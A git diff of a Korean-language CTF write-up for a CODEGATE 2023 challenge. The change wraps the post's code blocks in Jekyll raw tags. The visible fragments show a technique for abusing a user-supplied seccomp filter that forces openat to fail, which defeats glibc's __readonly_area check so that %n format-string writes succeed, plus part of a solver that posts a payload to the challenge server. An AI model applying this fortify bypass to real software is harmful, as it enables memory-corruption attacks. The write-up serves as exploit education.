@@ -13,6 +13,7 @@ categories: [CTF, CODEGATE2023, ]
 ---
 
 
+{% raw %}
 ```c
 // gcc box.c -o box -no-pie
 
@@ -126,6 +127,7 @@ void read_flag() {
     return;
 }
 ```
+{% endraw %}
 
 
 입력 받은 seccomp 필터를 바이너리에 적용한 후에 FSB를 트리거 할 수 있게 해준다.
@@ -146,6 +148,7 @@ target을 0x1337로 변조하면 플래그를 출력해주지만, `printf_chk` �
 `__readonly_area` 함수에서는 해당 포인터가 read-only 영역인지 확인한다. 하지만 fopen에 실패했을 경우 에러코드를 통해 해당 영역이 read-only 영역에 해당하는 지를 반환한다. 
 
 
+{% raw %}
 ```c
 int
 __readonly_area (const char *ptr, size_t size)
@@ -170,6 +173,7 @@ __readonly_area (const char *ptr, size_t size)
 .
 .
 ```
+{% endraw %}
 
 
 {: file='sysdeps/unix/sysv/linux/readonly-area.c'}
@@ -187,6 +191,7 @@ seccomp를 통해 `openat` 시스템콜을 막고 원하는 에러코드를 반�
 또한 `openat` 시스템콜은 rsi를 파일명 포인터로 받으므로 `A = args[1]`로 설정해주어야 한다.
 
 
+{% raw %}
 ```ruby
 A = sys_number
 A != openat ? ok : next
@@ -196,6 +201,7 @@ return ERRNO(2)
 ok:
 return ALLOW
 ```
+{% endraw %}
 
 
 이제 `%n`을 사용할 수 있으므로 FSB를 통해 값을 변조하면 된다.
@@ -207,6 +213,7 @@ return ALLOW
 ---
 
 
+{% raw %}
 ```python
 import requests
 import base64 
@@ -232,6 +239,7 @@ res = requests.post('http://15.164.245.40:1400/', data={'payload':base64.b64enco
 
 print(res.text)
 ```
+{% endraw %}
 
 
 ## 레퍼런스
